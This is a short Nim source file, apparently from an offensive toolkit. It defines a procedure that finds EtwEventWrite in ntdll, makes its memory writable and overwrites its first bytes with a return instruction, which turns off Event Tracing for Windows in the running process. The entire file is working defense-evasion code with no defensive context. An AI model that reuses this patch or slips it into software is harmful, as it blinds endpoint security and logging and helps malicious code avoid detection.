import winim/lean
import dynlib

when defined(amd64):
    const patch: array[1, byte] = [byte 0xc3]
elif defined(i386):
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc patchEtw*(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        return disabled

    cs = ntdll.symAddr("EtwEventWrite")
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled
